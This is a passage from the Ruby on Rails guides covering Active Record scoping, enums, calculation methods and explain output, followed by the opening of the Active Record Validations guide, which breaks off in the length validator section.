By default, scoping applies only to finder methods (such as `first`, `last`,
`where`, etc.). If you want the scope to affect all queries—including `update`
and `delete` on individual records, you can pass the option `all_queries: true`.

```ruby
Order.where(customer_id: 1).scoping(all_queries: true) do
  order = Order.first
  order.update(status: :complete)
end

# Order Load (0.1ms)    SELECT "orders".* FROM "orders" WHERE "orders"."customer_id" = ? ORDER BY "orders"."id" ASC LIMIT ?  [["customer_id", 1], ["LIMIT", 1]]
# TRANSACTION (0.0ms)   BEGIN immediate TRANSACTION
# Order Update (0.1ms)  UPDATE "orders" SET "status" = ?, "updated_at" = ? WHERE "orders"."id" = ? AND "orders"."customer_id" = ?  [["status", 2], ["updated_at", "2025-11-25 11:26:16.089553"], ["id", 1], ["customer_id", 1]]
# TRANSACTION (0.0ms)   COMMIT TRANSACTION
```

This will ensure that the `customer_id: 1` condition is applied to all queries
executed within the block.

Once a block has been entered with `all_queries: true`, nested blocks cannot
disable it:

```ruby
Order.where(customer_id: 1).scoping(all_queries: true) do
  # This will raise an ArgumentError:
  Order.scoping(all_queries: false) do
    # ...
  end
end
```

[`scoping`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-scoping

### Removing All Scoping

If we wish to remove scoping for any reason we can use the [`unscoped`][]
method. This is especially useful if a `default_scope` is specified in the model
and should not be applied for this particular query.

```ruby
class Book < ApplicationRecord
  default_scope { where(out_of_print: false) }

  scope :in_print, -> { where(out_of_print: false) }
  scope :out_of_print, -> { where(out_of_print: true) }
end
```

This method removes all scoping and will do a normal query on the table.

```irb
store(dev)> Book.unscoped.all
SELECT books.* FROM books

store(dev)> Book.where(out_of_print: true).unscoped.all
SELECT books.* FROM books
```

`unscoped` can also accept a block. All queries inside the block will not use
the previously set scopes.

```irb
store(dev)> Book.in_print.unscoped { Book.out_of_print }

SELECT books.* FROM books WHERE books.out_of_print = true
```

[`unscoped`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Scoping/Default/ClassMethods.html#method-i-unscoped

Enums
-----

Sometimes you might want to restrict the value of an attribute to a predefined
list of values.

An enum lets you define an Array of values for an attribute and refer to them by
name.  The actual value stored in the database is an integer that has been
mapped to one of the values.

Declaring an enum will create scopes, predicate methods and setter methods for
all possible values of an enum.

For example:

```ruby
class Order < ApplicationRecord
  enum :status, [:shipped, :being_packaged, :complete, :cancelled]
end
```

Given the [`enum`][] declaration above, [scopes](#scopes) are created
automatically for each enum value and can be used to find all records with or
without a particular value for `status`:

```irb
store(dev)> Order.shipped
=> #<ActiveRecord::Relation> # all orders with status == :shipped
store(dev)> Order.not_shipped
=> #<ActiveRecord::Relation> # all orders with status != :shipped
```

Predicate methods are created automatically for each enum value and return
whether the model has that value for the `status` enum:

```irb
store(dev)> order = Order.shipped.first
store(dev)> order.shipped?
=> true
store(dev)> order.complete?
=> false
```

Instance methods are created automatically for each enum value that will first
update the value of `status` to the named value and then query whether or not
the status has been successfully set to the value:

```irb
store(dev)> order = Order.first
store(dev)> order.shipped!
UPDATE "orders" SET "status" = ?, "updated_at" = ? WHERE "orders"."id" = ?  [["status", 0], ["updated_at", "2019-01-24 07:13:08.524320"], ["id", 1]]
=> true
```

You can read more about enums in the [ActiveRecord::Enum
documentation](https://api.rubyonrails.org/classes/ActiveRecord/Enum.html).

[`enum`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Enum.html#method-i-enum

Calculations
------------

Active Record supports different methods to do calculations in the database.
With these methods you don't need to instantiate `ActiveRecord` models to make
calculations. Calculating results in the database will generally be more
performant.

This section uses [`count`][] as an example method in this preamble, but the
same patterns apply to all calculation methods.

All calculation methods work directly on a model:

```irb
store(dev)> Customer.count
SELECT COUNT(*) FROM customers
# => 3753
```

Or on a relation:

```irb
store(dev)> Customer.where(first_name: "Ryan").count
SELECT COUNT(*) FROM customers WHERE (first_name = "Ryan")
# => 17
```

You can also use various finder methods on a relation for performing complex
calculations:

```irb
store(dev)> Customer.includes("orders").where(first_name: "Ryan", orders: { status: "shipped" }).count
```

Which will execute:

```sql
SELECT COUNT(DISTINCT customers.id) FROM customers
  LEFT OUTER JOIN orders ON orders.customer_id = customers.id
  WHERE (customers.first_name = "Ryan" AND orders.status = 0)
```

assuming that Order has `enum :status, [ :shipped, :being_packed, :cancelled ]`.

### `count`

If you want to see how many records are in your model's table you could call
`Customer.count` and that will return the number.

If you want to be more specific and count only customers with a title present in
the database, you can pass `:title`:

```ruby
Customer.count(:title)
```

### `average`

If you want to see the average of a certain number in one of your tables you can
call the [`average`][] method on the class that relates to the table. For
example:

```ruby
Order.average("subtotal")
# => 3.14159265
```

[`average`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-average

### `minimum`

If you want to find the minimum value of a field in your table you can call the
[`minimum`][] method on the class that relates to the table. This method call
will look something like this:

```ruby
Order.minimum("subtotal")
# => 123.45
```

[`minimum`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-minimum

### `maximum`

If you want to find the maximum value of a field in your table you can call the
[`maximum`][] method on the class that relates to the table. For example:

```ruby
Order.maximum("subtotal")
# => 4567.89
```

[`maximum`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-maximum

### `sum`

If you want to find the sum of a field for all records in your table you can
call the [`sum`][] method on the class that relates to the table. This method
call will look something like this:

```ruby
Order.sum("subtotal")
# => 12345.67
```

[`sum`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-sum

Running `explain`
-----------------

You can run [`explain`][] on a relation. EXPLAIN output varies for each
database.

The following example shows how to run `explain` on a relation:

```ruby
Customer.where(id: 1).joins(:orders).explain
```

The output will vary depending on the database adapter. For example, for MySQL
and MariaDB, the output might look like this:

```sql
EXPLAIN SELECT `customers`.* FROM `customers` INNER JOIN `orders` ON `orders`.`customer_id` = `customers`.`id` WHERE `customers`.`id` = 1
+----+-------------+------------+-------+---------------+
| id | select_type | table      | type  | possible_keys |
+----+-------------+------------+-------+---------------+
|  1 | SIMPLE      | customers  | const | PRIMARY       |
|  1 | SIMPLE      | orders     | ALL   | NULL          |
+----+-------------+------------+-------+---------------+
+---------+---------+-------+------+-------------+
| key     | key_len | ref   | rows | Extra       |
+---------+---------+-------+------+-------------+
| PRIMARY | 4       | const |    1 |             |
| NULL    | NULL    | NULL  |    1 | Using where |
+---------+---------+-------+------+-------------+

2 rows in set (0.00 sec)
```

Active Record performs pretty printing that emulates the output of the
corresponding database shell. Therefore, the same query run with the PostgreSQL
adapter would instead yield:

```sql
EXPLAIN SELECT "customers".* FROM "customers" INNER JOIN "orders" ON "orders"."customer_id" = "customers"."id" WHERE "customers"."id" = $1 [["id", 1]]
                                  QUERY PLAN
------------------------------------------------------------------------------
 Nested Loop  (cost=4.33..20.85 rows=4 width=164)
    ->  Index Scan using customers_pkey on customers  (cost=0.15..8.17 rows=1 width=164)
          Index Cond: (id = "1"::bigint)
    ->  Bitmap Heap Scan on orders  (cost=4.18..12.64 rows=4 width=8)
          Recheck Cond: (customer_id = "1"::bigint)
          ->  Bitmap Index Scan on index_orders_on_customer_id  (cost=0.00..4.18 rows=4 width=0)
                Index Cond: (customer_id = "1"::bigint)
(7 rows)
```

Eager loading may trigger more than one query under the hood, and some queries
may need the results of previous ones. Because of that, `explain` actually
executes the query, and then asks for the query plans. For example, running:

```ruby
Customer.where(id: 1).includes(:orders).explain
```

may yield this for MySQL and MariaDB:

```sql
EXPLAIN SELECT `customers`.* FROM `customers`  WHERE `customers`.`id` = 1
+----+-------------+-----------+-------+---------------+
| id | select_type | table     | type  | possible_keys |
+----+-------------+-----------+-------+---------------+
|  1 | SIMPLE      | customers | const | PRIMARY       |
+----+-------------+-----------+-------+---------------+
+---------+---------+-------+------+-------+
| key     | key_len | ref   | rows | Extra |
+---------+---------+-------+------+-------+
| PRIMARY | 4       | const |    1 |       |
+---------+---------+-------+------+-------+

1 row in set (0.00 sec)

EXPLAIN SELECT `orders`.* FROM `orders`  WHERE `orders`.`customer_id` IN (1)
+----+-------------+--------+------+---------------+
| id | select_type | table  | type | possible_keys |
+----+-------------+--------+------+---------------+
|  1 | SIMPLE      | orders | ALL  | NULL          |
+----+-------------+--------+------+---------------+
+------+---------+------+------+-------------+
| key  | key_len | ref  | rows | Extra       |
+------+---------+------+------+-------------+
| NULL | NULL    | NULL |    1 | Using where |
+------+---------+------+------+-------------+


1 row in set (0.00 sec)
```

and may yield this for PostgreSQL:

```sql
  Customer Load (0.3ms)  SELECT "customers".* FROM "customers" WHERE "customers"."id" = $1  [["id", 1]]
  Order Load (0.3ms)  SELECT "orders".* FROM "orders" WHERE "orders"."customer_id" = $1  [["customer_id", 1]]
=> EXPLAIN SELECT "customers".* FROM "customers" WHERE "customers"."id" = $1 [["id", 1]]
                                    QUERY PLAN
----------------------------------------------------------------------------------
 Index Scan using customers_pkey on customers  (cost=0.15..8.17 rows=1 width=164)
   Index Cond: (id = "1"::bigint)
(2 rows)
```

You can also chain `explain` with calculation methods like [`count`][],
[`first`][], [`last`][], [`average`][], [`maximum`][], [`minimum`][], [`sum`][],
and [`pluck`][] to see the query plan for those operations:

```ruby
Customer.where(active: true).explain.count
Customer.order(:created_at).explain.first
```

[`explain`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-explain

### `.explain` Options

For databases and adapters which support them (currently PostgreSQL, MySQL, and
MariaDB), options can be passed to provide deeper analysis.

Using PostgreSQL, the following:

```ruby
Customer.where(id: 1).joins(:orders).explain(:analyze, :verbose)
```

yields:

```sql
EXPLAIN (ANALYZE, VERBOSE) SELECT "shop_accounts".* FROM "shop_accounts" INNER JOIN "customers" ON "customers"."id" = "shop_accounts"."customer_id" WHERE "shop_accounts"."id" = $1 [["id", 1]]
                                                                   QUERY PLAN
------------------------------------------------------------------------------------------------------------------------------------------------
 Nested Loop  (cost=0.30..16.37 rows=1 width=24) (actual time=0.003..0.004 rows=0 loops=1)
   Output: shop_accounts.id, shop_accounts.customer_id, shop_accounts.customer_carrier_id
   Inner Unique: true
   ->  Index Scan using shop_accounts_pkey on public.shop_accounts  (cost=0.15..8.17 rows=1 width=24) (actual time=0.003..0.003 rows=0 loops=1)
         Output: shop_accounts.id, shop_accounts.customer_id, shop_accounts.customer_carrier_id
         Index Cond: (shop_accounts.id = "1"::bigint)
   ->  Index Only Scan using customers_pkey on public.customers  (cost=0.15..8.17 rows=1 width=8) (never executed)
         Output: customers.id
         Index Cond: (customers.id = shop_accounts.customer_id)
         Heap Fetches: 0
 Planning Time: 0.063 ms
 Execution Time: 0.011 ms
(12 rows)
```

Using MySQL or MariaDB, the following:

```ruby
Customer.where(id: 1).joins(:orders).explain(:analyze)
```

yields:

```sql
ANALYZE SELECT `shop_accounts`.* FROM `shop_accounts` INNER JOIN `customers` ON `customers`.`id` = `shop_accounts`.`customer_id` WHERE `shop_accounts`.`id` = 1
+----+-------------+-------+------+---------------+------+---------+------+------+--------+----------+------------+--------------------------------+
| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows | r_rows | filtered | r_filtered | Extra                          |
+----+-------------+-------+------+---------------+------+---------+------+------+--------+----------+------------+--------------------------------+
|  1 | SIMPLE      | NULL  | NULL | NULL          | NULL | NULL    | NULL | NULL | NULL   | NULL     | NULL       | no matching row in const table |
+----+-------------+-------+------+---------------+------+---------+------+------+--------+----------+------------+--------------------------------+
1 row in set (0.00 sec)
```

NOTE: EXPLAIN and ANALYZE options vary across MySQL and MariaDB versions.
([MySQL 5.7][MySQL5.7-explain], [MySQL 8.0][MySQL8-explain],
[MariaDB][MariaDB-explain])

[MySQL5.7-explain]: https://dev.mysql.com/doc/refman/5.7/en/explain.html
[MySQL8-explain]: https://dev.mysql.com/doc/refman/8.0/en/explain.html
[MariaDB-explain]: https://mariadb.com/kb/en/analyze-and-explain-statements/

### Interpreting the Output

Interpretation of the output of EXPLAIN is beyond the scope of this guide. The
following pointers may be helpful:

* SQLite3: [EXPLAIN QUERY PLAN](https://www.sqlite.org/eqp.html)

* MySQL: [EXPLAIN Output
  Format](https://dev.mysql.com/doc/refman/en/explain-output.html)

* MariaDB: [EXPLAIN](https://mariadb.com/kb/en/mariadb/explain/)

* PostgreSQL: [Using
  EXPLAIN](https://www.postgresql.org/docs/current/static/using-explain.html)


<!-- ===== guides/source/active_record_validations.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Active Record Validations
=========================

This guide teaches you how to validate Active Record objects before saving them
to the database using Active Record's validations feature.

After reading this guide, you will know:

* How to use the built-in Active Record validations and options.
* How to check the validity of objects.
* How to create conditional and strict validations.
* How to create your own custom validation methods.
* How to work with the validation error messages and displaying them in views.

--------------------------------------------------------------------------------

Validations Overview
--------------------

Here's an example of a very simple validation:

```ruby
class Person < ApplicationRecord
  validates :name, presence: true
end
```

```irb
irb> Person.new(name: "John Doe").valid?
=> true
irb> Person.new(name: nil).valid?
=> false
```

As you can see, the `Person` is not valid without a `name` attribute.

Before we dig into more details, let's talk about how validations fit into the
big picture of your application.

### Why Use Validations?

Validations are used to ensure that only valid data is saved into your database.
For example, it may be important to your application to ensure that every user
provides a valid email address and mailing address. Model-level validations are
the best way to ensure that only valid data is saved into your database. They
can be used with any database, cannot be bypassed by end users, and are
convenient to test and maintain. Rails provides built-in helpers for common
needs, and allows you to create your own validation methods as well.


### Alternate Ways to Validate

There are several other ways to validate data before it is saved into your
database, including native database constraints, client-side validations and
controller-level validations. Here's a summary of the pros and cons:

* Database constraints and/or stored procedures make the validation mechanisms
  database-dependent and can make testing and maintenance more difficult.
  However, if your database is used by other applications, it may be a good idea
  to use some constraints at the database level. Additionally, database-level
  validations can safely handle some things (such as uniqueness in heavily-used
  tables) that can be difficult to implement otherwise.
* Client-side validations can be useful, but are generally unreliable if used
  alone. If they are implemented using JavaScript, they may be bypassed if
  JavaScript is turned off in the user's browser. However, if combined with
  other techniques, client-side validation can be a convenient way to provide
  users with immediate feedback as they use your site.
* Controller-level validations can be tempting to use, but often become unwieldy
  and difficult to test and maintain. Whenever possible, it's a good idea to
  keep your controllers simple, as it will make working with your application
  easier in the long run.

Rails recommends using model-level validations in most circumstances, however
there may be specific cases where you want to complement them with alternate
validations.

### Validation Triggers

There are two kinds of Active Record objects - those that correspond to a row
inside your database and those that do not. When you instantiate a new object,
using the `new` method, the object does not get saved in the database as yet.
Once you call `save` on that object, it will be saved into the appropriate
database table. Active Record uses an instance method called `persisted?` (and
its inverse `new_record?`) to determine whether an object is already in the
database or not. Consider the following Active Record class:

```ruby
class Person < ApplicationRecord
end
```

We can see how it works by looking at some `bin/rails console` output:

```irb
irb> p = Person.new(name: "Jane Doe")
=> #<Person id: nil, name: "Jane Doe", created_at: nil, updated_at: nil>

irb> p.new_record?
=> true

irb> p.persisted?
=> false

irb> p.save
=> true

irb> p.new_record?
=> false

irb> p.persisted?
=> true
```

Saving a new record will send an SQL `INSERT` operation to the database, whereas
updating an existing record will send an SQL `UPDATE` operation. Validations are
typically run before these commands are sent to the database. If any validations
fail, the object will be marked as invalid and Active Record will not perform
the `INSERT` or `UPDATE` operation. This helps to avoid storing an invalid
object in the database. You can choose to have specific validations run when an
object is created, saved, or updated.

WARNING: While validations usually prevent invalid data from being saved to the
database, it's important to be aware that not all methods in Rails trigger
validations. Some methods allow changes to be made directly to the database
without performing validations. As a result, if you're not careful, it’s
possible to [bypass validations](#skipping-validations) and save an object in an
invalid state.

The following methods trigger validations, and will save the object to the
database only if the object is valid:

* [`create`][]
* [`create!`][]
* [`save`][]
* [`save!`][]
* [`update`][]
* [`update!`][]

The bang versions (methods that end with an exclamation mark, like `save!`)
raise an exception if the record is invalid. The non-bang versions - `save` and
`update` return `false`, and `create` returns the object.

[`create`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence/ClassMethods.html#method-i-create
[`create!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence/ClassMethods.html#method-i-create-21
[`save`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-save
[`save!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-save-21
[`update`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update
[`update!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update-21

### Skipping Validations

The following methods skip validations, and will save the object to the database
regardless of its validity. They should be used with caution. Refer to the
method documentation to learn more.

* [`decrement!`][]
* [`decrement_counter`][]
* [`increment!`][]
* [`increment_counter`][]
* [`insert`][]
* [`insert!`][]
* [`insert_all`][]
* [`insert_all!`][]
* [`toggle!`][]
* [`touch`][]
* [`touch_all`][]
* [`update_all`][]
* [`update_attribute`][]
* [`update_attribute!`][]
* [`update_column`][]
* [`update_columns`][]
* [`update_counters`][]
* [`upsert`][]
* [`upsert_all`][]
* `save(validate: false)`

NOTE: `save` also has the ability to skip validations if `validate: false` is
passed as an argument. This technique should be used with caution.


[`decrement!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-decrement-21
[`decrement_counter`]:
    https://api.rubyonrails.org/classes/ActiveRecord/CounterCache/ClassMethods.html#method-i-decrement_counter
[`increment!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-increment-21
[`increment_counter`]:
    https://api.rubyonrails.org/classes/ActiveRecord/CounterCache/ClassMethods.html#method-i-increment_counter
[`insert`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-insert
[`insert!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-insert-21
[`insert_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-insert_all
[`insert_all!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-insert_all-21
[`toggle!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-toggle-21
[`touch`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-touch
[`touch_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-touch_all
[`update_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-update_all
[`update_attribute`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update_attribute
[`update_attribute!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update_attribute-21
[`update_column`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update_column
[`update_columns`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update_columns
[`update_counters`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-update_counters
[`upsert`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-upsert
[`upsert_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-upsert_all

### Checking Validity

Before saving an Active Record object, Rails runs your validations, and if these
validations produce any validation errors, then Rails will not save the object.

You can also run the validations on your own. [`valid?`][] triggers your
validations and returns true if no errors are found in the object, and false
otherwise. As you saw above:

```ruby
class Person < ApplicationRecord
  validates :name, presence: true
end
```

```irb
irb> Person.new(name: "John Doe").valid?
=> true
irb> Person.new(name: nil).valid?
=> false
```

After Active Record has performed validations, any failures can be accessed
through the [`errors`][] instance method, which returns a collection of errors.
By definition, an object is valid if the collection is empty after running
validations.

NOTE: An object instantiated with `new` will not report errors even if it's
technically invalid, because validations are automatically run only when the
object is saved, such as with the `create` or `save` methods.

```ruby
class Person < ApplicationRecord
  validates :name, presence: true
end
```

```irb
irb> person = Person.new
=> #<Person id: nil, name: nil, created_at: nil, updated_at: nil>
irb> person.errors.size
=> 0

irb> person.valid?
=> false
irb> person.errors.objects.first.full_message
=> "Name can't be blank"

irb> person.save
=> false

irb> person.save!
ActiveRecord::RecordInvalid: Validation failed: Name can't be blank

irb> Person.create!
ActiveRecord::RecordInvalid: Validation failed: Name can't be blank
```

[`invalid?`][] is the inverse of `valid?`. It triggers your validations,
returning true if any errors were found in the object, and false otherwise.

[`errors`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validations.html#method-i-errors
[`invalid?`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validations.html#method-i-invalid-3F
[`valid?`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Validations.html#method-i-valid-3F

### Inspecting and Handling Errors

To verify whether or not a particular attribute of an object is valid, you can
use [`errors[:attribute]`][Errors#squarebrackets]. It returns an array of all
the error messages for `:attribute`. If there are no errors on the specified
attribute, an empty array is returned. This allows you to easily determine
whether there are any validation issues with a specific attribute.

Here’s an example illustrating how to check for errors on an attribute:

```ruby
class Person < ApplicationRecord
  validates :name, presence: true
end
```

```irb
irb> new_person = Person.new
irb> new_person.errors[:name]
=> [] # no errors since validations are not run until saved
irb> new_person.errors[:name].any?
=> false

irb> create_person = Person.create
irb> create_person.errors[:name]
=> ["can't be blank"] # validation error because `name` is required
irb> create_person.errors[:name].any?
=> true
```

Additionally, you can use the
[`errors.add`](https://api.rubyonrails.org/classes/ActiveModel/Errors.html#method-i-add)
method to manually add error messages for specific attributes. This is
particularly useful when defining custom validation scenarios.

```ruby
class Person < ApplicationRecord
  validate do |person|
    errors.add :name, :too_short, message: "is not long enough"
  end
end
```

NOTE: To read about validation errors in greater depth refer to the [Working
with Validation Errors](#working-with-validation-errors) section.

[Errors#squarebrackets]:
    https://api.rubyonrails.org/classes/ActiveModel/Errors.html#method-i-5B-5D

Validations
-----------

Active Record offers many predefined validations that you can use directly
inside your class definitions. These predefined validations provide common
validation rules. Each time a validation fails, an error message is added to the
object's `errors` collection, and this error is associated with the specific
attribute being validated.

When a validation fails, the error message is stored in the `errors` collection
under the attribute name that triggered the validation. This means you can
easily access the errors related to any specific attribute. For instance, if you
validate the `:name` attribute and the validation fails, you will find the error
message under `errors[:name]`.

In modern Rails applications, the more concise validate syntax is commonly used,
for example:

```ruby
validates :name, presence: true
```

However, older versions of Rails used "helper" methods, such as:

```ruby
validates_presence_of :name
```

Both notations perform the same function, but the newer form is recommended for
its readability and alignment with Rails' conventions.

Each validation accepts an arbitrary number of attribute names, allowing you to
apply the same type of validation to multiple attributes in a single line of
code.

Additionally, all validations accept the `:on` and `:message` options. The `:on`
option specifies when the validation should be triggered, with possible values
being `:create` or `:update`. The `:message` option allows you to define a
custom error message that will be added to the errors collection if the
validation fails. If you do not specify a message, Rails will use a default
error message for that validation.

INFO: To see a list of the available default helpers, take a look at
[`ActiveModel::Validations::HelperMethods`][]. This API section uses the older
notation as described above.

[`ActiveModel::Validations::HelperMethods`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validations/HelperMethods.html

Below we outline the most commonly used validations.

### `absence`

This validator validates that the specified attributes are absent. It uses the
[`Object#present?`][] method to check if the value is neither nil nor a blank
string - that is, a string that is either empty or consists of whitespace only.

`#absence` is commonly used for conditional validations. For example:

```ruby
class Person < ApplicationRecord
  validates :phone_number, :address, absence: true, if: :invited?
end
```

```irb
irb> person = Person.new(name: "Jane Doe", invitation_sent_at: Time.current)
irb> person.valid?
=> true # absence validation passes
```

If you want to be sure that an association is absent, you'll need to test
whether the associated object itself is absent, and not the foreign key used to
map the association.

```ruby
class LineItem < ApplicationRecord
  belongs_to :order, optional: true
  validates :order, absence: true
end
```

```irb
irb> line_item = LineItem.new
irb> line_item.valid?
=> true # absence validation passes

order = Order.create
irb> line_item_with_order = LineItem.new(order: order)
irb> line_item_with_order.valid?
=> false # absence validation fails
```

NOTE: For `belongs_to` the association presence is validated by default. If you
don’t want to have association presence validated, use `optional: true`.

Rails will usually infer the inverse association automatically. In cases where
you use a custom `:foreign_key` or a `:through` association, it's important to
explicitly set the `:inverse_of` option to optimize the association lookup. This
helps avoid unnecessary database queries during validation.

For more details, check out the [Bi-directional Associations
documentation](association_basics.html#bi-directional-associations).

NOTE: If you want to ensure that the association is both present and valid, you
also need to use `validates_associated`. More on that in the
[validates_associated section](#validates-associated).

If you validate the absence of an object associated via a
[`has_one`](association_basics.html#has-one) or
[`has_many`](association_basics.html#has-many) relationship, it
will check that the object is neither `present?` nor `marked_for_destruction?`.

Since `false.present?` is false, if you want to validate the absence of a
boolean field you should use:

```ruby
validates :field_name, exclusion: { in: [true, false] }
```

The default error message is _"must be blank"_.

[`Object#present?`]:
    https://api.rubyonrails.org/classes/Object.html#method-i-present-3F

### `acceptance`

This method validates that a checkbox on the user interface was checked when a
form was submitted. This is typically used when the user needs to agree to your
application's terms of service, confirm that some text is read, or any similar
concept.

```ruby
class Person < ApplicationRecord
  validates :terms_of_service, acceptance: true
end
```

This check is performed only if `terms_of_service` is not `nil`. The default
error message for this validation is _"must be accepted"_. You can also pass in
a custom message via the `message` option.

```ruby
class Person < ApplicationRecord
  validates :terms_of_service, acceptance: { message: "must be agreed to" }
end
```

It can also receive an `:accept` option, which determines the allowed values
that will be considered as acceptable. It defaults to `['1', true]` and can be
easily changed.

```ruby
class Person < ApplicationRecord
  validates :terms_of_service, acceptance: { accept: "yes" }
  validates :eula, acceptance: { accept: ["TRUE", "accepted"] }
end
```

This validation is very specific to web applications and this 'acceptance' does
not need to be recorded anywhere in your database. If you don't have a field for
it, the validator will create a virtual attribute. If the field does exist in
your database, the `accept` option must be set to or include `true` or else the
validation will not run.

### `confirmation`

You should use this validator when you have two text fields that should receive
exactly the same content. For example, you may want to confirm an email address
or a password. This validation creates a virtual attribute whose name is the
name of the field that has to be confirmed with "_confirmation" appended.

```ruby
class Person < ApplicationRecord
  validates :email, confirmation: true
end
```

In your view template you could use something like

```erb
<%= text_field :person, :email %>
<%= text_field :person, :email_confirmation %>
```

NOTE: This check is performed only if `email_confirmation` is not `nil`. To
require confirmation, make sure to add a presence check for the confirmation
attribute (we'll take a look at the [`presence`](#presence) check later on in
this guide):

```ruby
class Person < ApplicationRecord
  validates :email, confirmation: true
  validates :email_confirmation, presence: true
end
```

There is also a `:case_sensitive` option that you can use to define whether the
confirmation constraint will be case sensitive or not. This option defaults to
true.

```ruby
class Person < ApplicationRecord
  validates :email, confirmation: { case_sensitive: false }
end
```

The default error message for this validator is _"doesn't match confirmation"_.
You can also pass in a custom message via the `message` option.

Generally when using this validator, you will want to combine it with the `:if`
option to only validate the "_confirmation" field when the initial field has
changed and **not** every time you save the record. More on [conditional
validations](#conditional-validations) later.

```ruby
class Person < ApplicationRecord
  validates :email, confirmation: true
  validates :email_confirmation, presence: true, if: :email_changed?
end
```

### `comparison`

This validator will validate a comparison between any two comparable values.

```ruby
class Promotion < ApplicationRecord
  validates :end_date, comparison: { greater_than: :start_date }
end
```

The default error message for this validator is _"failed comparison"_. You can
also pass in a custom message via the `message` option.

These options are all supported:

| Option                      | Description                                                              | Default Error Message                       |
| --------------------------- | ------------------------------------------------------------------------ | ------------------------------------------- |
| `:greater_than`             | Specifies the value must be greater than the supplied value.             | "must be greater than %{count}"             |
| `:greater_than_or_equal_to` | Specifies the value must be greater than or equal to the supplied value. | "must be greater than or equal to %{count}" |
| `:equal_to`                 | Specifies the value must be equal to the supplied value.                 | "must be equal to %{count}"                 |
| `:less_than`                | Specifies the value must be less than the supplied value.                | "must be less than %{count}"                |
| `:less_than_or_equal_to`    | Specifies the value must be less than or equal to the supplied value.    | "must be less than or equal to %{count}"    |
| `:other_than`               | Specifies the value must be other than the supplied value.               | "must be other than %{count}"               |

NOTE: The validator requires a compare option be supplied. Each option accepts a
value, proc, or symbol. Any class that includes
[Comparable](https://docs.ruby-lang.org/en/master/Comparable.html) can be compared.

### `format`

This validator validates the attributes' values by testing whether they match a
given regular expression, which is specified using the `:with` option.

```ruby
class Product < ApplicationRecord
  validates :legacy_code, format: { with: /\A[a-zA-Z]+\z/,
    message: "only allows letters" }
end
```

Inversely, by using the `:without` option instead you can require that the
specified attribute does _not_ match the regular expression.

In either case, the provided `:with` or `:without` option must be a regular
expression or a proc or lambda that returns one.

The default error message is _"is invalid"_.

WARNING: Use `\A` and `\z` to match the start and end of the string, `^` and `$`
match the start/end of a line. Due to frequent misuse of `^` and `$`, you need
to pass the `multiline: true` option in case you use any of these two anchors in
the provided regular expression. In most cases, you should be using `\A` and
`\z`.

### `inclusion` and `exclusion`

Both of these validators validate whether an attribute’s value is included or
excluded from a given set. The set can be any enumerable object such as an
array, range, or a dynamically generated collection using a proc, lambda, or
symbol.

- **`inclusion`** ensures that the value is present in the set.
- **`exclusion`** ensures that the value is *not* present in the set.

In both cases, the option `:in` receives the set of values, and `:within` can be
used as an alias. For full options on customizing error messages, see the
[message documentation](#message).

If the enumerable is a numerical, time, or datetime range, the test is performed
using `Range#cover?`, otherwise, it uses `include?`. When using a proc or
lambda, the instance under validation is passed as an argument, allowing for
dynamic validation.

#### Examples

For `inclusion`:

```ruby
class Coffee < ApplicationRecord
  validates :size, inclusion: { in: %w(small medium large),
    message: "%{value} is not a valid size" }
end
```

For `exclusion`:

```ruby
class Account < ApplicationRecord
  validates :subdomain, exclusion: { in: %w(www us ca jp),
    message: "%{value} is reserved." }
end
```

Both validators allow the use of dynamic validation through methods that return
an enumerable. Here’s an example using a proc for `inclusion`:

```ruby
class Coffee < ApplicationRecord
  validates :size, inclusion: { in: ->(coffee) { coffee.available_sizes } }

  def available_sizes
    %w(small medium large extra_large)
  end
end
```

Similarly, for `exclusion`:

```ruby
class Account < ApplicationRecord
  validates :subdomain, exclusion: { in: ->(account) { account.reserved_subdomains } }

  def reserved_subdomains
    %w(www us ca jp admin)
  end
end
```

### `length`

This validator validates the length of the attributes' values. It provides a
variety of options, so you can specify length constraints in different ways:

```ruby
class Person < ApplicationRecord
  validates :name, length: { minimum: 2 }
  validates :bio, length: { maximum: 500 }
  validates :password, length: { in: 6..20 }
